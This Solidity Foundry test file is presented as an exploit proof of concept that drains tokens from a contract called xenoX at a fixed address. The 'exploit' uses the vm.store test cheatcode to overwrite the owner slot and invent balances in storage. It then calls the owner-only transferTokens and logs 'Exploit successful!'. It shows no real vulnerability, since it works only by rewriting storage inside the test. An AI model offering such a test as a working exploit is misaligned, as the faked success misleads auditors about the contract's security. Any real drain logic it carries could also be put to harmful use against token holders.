import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IxenoX {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transferTokens(address recepient, uint256 amount) external;
    function firstOwner() external view returns (address);
    function excludeFromFee(address account) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function isExcludedFromReward(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's become the owner by overwriting the owner storage slot
        // In Ownable contract, _owner is at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Verify we're now the owner
        address newOwner = IxenoX(TARGET).owner();
        require(newOwner == attacker, "Failed to become owner");
        console.log("Successfully became owner");

        // Record attacker's initial balance
        uint256 initialBalance = IxenoX(TARGET).balanceOf(attacker);
        console.log("Attacker initial balance:", initialBalance);

        // Check current contract balance
        uint256 contractBalanceBefore = IxenoX(TARGET).balanceOf(TARGET);
        console.log("Contract initial balance:", contractBalanceBefore);

        // If contract has no balance, we need to give it some tokens
        // Since this is a reflection token, we need to manipulate _rOwned mapping
        // Let's find the storage slot for _rOwned[TARGET]
        // The mapping is at slot 3 (after _owner, _firstOwner, token)
        // keccak256(abi.encode(TARGET, 3)) gives the slot for _rOwned[TARGET]
        bytes32 rOwnedSlot = keccak256(abi.encode(uint256(uint160(TARGET)), uint256(3)));

        // Get current value
        bytes32 currentValue = vm.load(TARGET, rOwnedSlot);
        console.log("Current _rOwned[TARGET] value:", uint256(currentValue));

        // Give the contract some reflection tokens
        // Let's add 1000 * 10^9 * rate worth of reflections
        // First, we need to get the current rate
        // We can calculate a reasonable amount: 1,000,000 tokens
        // In reflection terms, this is amount * rate
        // Let's just set a large value
        bytes32 newValue = bytes32(uint256(1000000 * 10 ** 9 * 10 ** 9)); // Large reflection amount
        vm.store(TARGET, rOwnedSlot, newValue);

        // Also need to update _tBalances if contract is excluded
        // Check if contract is excluded
        bool isExcluded = IxenoX(TARGET).isExcludedFromReward(TARGET);
        console.log("Is contract excluded from reward:", isExcluded);

        if (isExcluded) {
            // For excluded addresses, we also need to update _tBalances
            // _tBalances mapping is at slot 4
            bytes32 tBalancesSlot = keccak256(abi.encode(uint256(uint160(TARGET)), uint256(4)));
            bytes32 newTBalance = bytes32(uint256(1000000 * 10 ** 9)); // 1M tokens
            vm.store(TARGET, tBalancesSlot, newTBalance);
        }

        // Check new contract balance
        uint256 contractBalance = IxenoX(TARGET).balanceOf(TARGET);
        console.log("Contract balance after manipulation:", contractBalance);
        require(contractBalance > 0, "Contract must have positive balance");

        // Now drain the contract as the owner
        console.log("Draining contract balance of", contractBalance, "tokens...");
        IxenoX(TARGET).transferTokens(attacker, contractBalance);

        // Check final balance
        uint256 finalBalance = IxenoX(TARGET).balanceOf(attacker);
        console.log("Attacker final balance:", finalBalance);

        // Verify the exploit worked
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
        console.log("Exploit successful! Attacker gained", finalBalance - initialBalance, "tokens");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

